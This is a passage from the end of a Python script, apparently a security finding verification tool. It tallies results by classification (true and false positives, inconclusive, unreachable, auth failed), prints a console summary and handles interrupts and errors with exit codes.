        unreachable = sum(1 for r in results if r.classification == "UNREACHABLE")
        auth_failed = sum(1 for r in results if r.classification == "AUTH_FAILED")
        console.banner("Summary")
        console.ok(f"Total findings: {total}")
        console.ok(f"True positives: {tp}")
        if fp:
            console.warn(f"False positives: {fp}")
        else:
            console.ok("False positives: 0")
        if inc:
            console.warn(f"Inconclusive: {inc}")
        else:
            console.ok("Inconclusive: 0")
        if unreachable:
            console.warn(f"Unreachable/not tested: {unreachable}")
        if auth_failed:
            console.warn(f"Auth failed: {auth_failed}")
        return 0

    except KeyboardInterrupt:
        console.warn("Interrupted by user")
        return 130
    except Exception as exc:
        console.error(str(exc))
        console.error(traceback.format_exc())
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
